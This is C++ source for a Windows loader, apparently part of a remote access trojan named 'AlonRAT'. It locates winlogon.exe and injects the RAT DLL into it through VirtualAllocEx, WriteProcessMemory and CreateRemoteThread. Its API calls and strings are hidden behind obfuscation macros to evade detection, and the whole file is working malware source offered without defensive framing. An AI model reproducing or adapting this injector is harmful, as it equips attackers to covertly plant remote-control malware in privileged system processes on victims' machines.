#include <WS2tcpip.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "utils.h"
#include <iostream>

#define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Debug\\AlonRAT.dll")
#define PROCESS_NAME OBFUSCATE("winlogon.exe")

bool inject(DWORD pid, const char* dll_store_path)
{
    get_proc_address_type get_proc_address = WINAPI_OBFUSCATE(get_proc_address_type, "GetProcAddress", "kernel32");
    get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
    write_process_memory_type write_process_memory = WINAPI_OBFUSCATE(write_process_memory_type, "WriteProcessMemory", "kernel32");
    virtual_free_ex_type virtual_free_ex = WINAPI_OBFUSCATE(virtual_free_ex_type, "VirtualFreeEx", "kernel32");
    create_remote_thread_type create_remote_thread = WINAPI_OBFUSCATE(create_remote_thread_type, "CreateRemoteThread", "kernel32");
    HANDLE hProcess = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32")(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        MessageBoxA(
            nullptr,
            "fail",
            "fail",
            0
        );
        return false;
    }

    // Get the address of LoadLibraryA in the target process
    LPVOID loadLibraryAddr = (LPVOID)get_proc_address(get_module_handle(OBFUSCATE(L"kernel32.dll")), OBFUSCATE("LoadLibraryA"));
    if (loadLibraryAddr == NULL) {
        close_handle(hProcess);
        return false;
    }

    // Allocate memory for the DLL data in the target process
    LPVOID remoteDllData = WINAPI_OBFUSCATE(virtual_alloc_ex_type, "VirtualAllocEx", "kernel32")(hProcess, NULL, strlen(dll_store_path), MEM_COMMIT, PAGE_READWRITE);
    if (remoteDllData == NULL) {
        close_handle(hProcess);
        return false;
    }

    // Write the DLL data to the allocated memory in the target process
    if (!write_process_memory(hProcess, remoteDllData, dll_store_path, strlen(dll_store_path), NULL)) {
        virtual_free_ex(hProcess, remoteDllData, 0, MEM_RELEASE);
        close_handle(hProcess);
        return false;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE hThread = create_remote_thread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteDllData, 0, NULL);
    if (hThread == NULL) {
        virtual_free_ex(hProcess, remoteDllData, 0, MEM_RELEASE);
        close_handle(hProcess);
        return false;
    }

    return true;
}


DWORD get_pid(const char* process_name) {
    DWORD pid = 0;
    create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
    process32_first_type process32_first = WINAPI_OBFUSCATE(process32_first_type, "Process32First", "kernel32");
    process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");

    HANDLE hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (process32_first(hSnapshot, &pe32)) {
        do {
            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), process_name) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (process32_next(hSnapshot, &pe32));
    }

    close_handle(hSnapshot);
    return pid;
}

int CALLBACK WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, int n_cmd_show) {
    initilize_winapi();
    const auto pid = get_pid(PROCESS_NAME);
    inject(pid, DLL_PATH);
    while (1) {
        
        WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32")(1000 * 10);
    }
}
